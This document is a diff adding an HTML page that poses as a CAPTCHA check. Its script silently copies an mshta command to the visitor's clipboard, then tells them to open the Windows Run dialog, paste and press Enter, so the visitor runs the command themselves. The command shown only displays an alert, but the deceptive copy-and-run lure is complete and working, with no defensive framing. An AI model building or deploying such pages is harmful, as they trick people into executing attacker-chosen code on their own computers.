@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hihihihi!</title>
+</head>
+<style>
+.button {
+  background-color: #04AA6D; /* Green */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+}
+
+.hidden {
+  display: none;
+        }
+
+</style>
+<body>
+
+<p>Verify that you are a human to continue:</p>
+<div class="button" id="verifyButton">
+	<span>I'm not a robot</span>
+</div>
+<div id="captchaPopup" class="hidden">
+<h3>Verification steps</h3>
+<p>1. Press Windows button + R</p>
+<p>2. Press CRTL + V</p>
+<p>3. Press Enter </p>
+</div>
+
+    <script>
+        function verify() {
+	   const cbText = "mshta javascript:alert('Pahuutta!');close();";
+	   const tempTextArea = document.createElement("textarea");
+	   tempTextArea.value = cbText;
+	   document.body.appendChild(tempTextArea);
+	   tempTextArea.select();
+	   document.execCommand("copy");
+	   document.body.removeChild(tempTextArea);
+
+	   const captchaPopup = document.getElementById("captchaPopup");
+           captchaPopup.classList.toggle('hidden'); // Vaihda näkyvyyttä
+                }
+
+const verifyButton = document.getElementById('verifyButton');
+    verifyButton.addEventListener('click', verify);
+
+    </script>
+</body>
+</html>
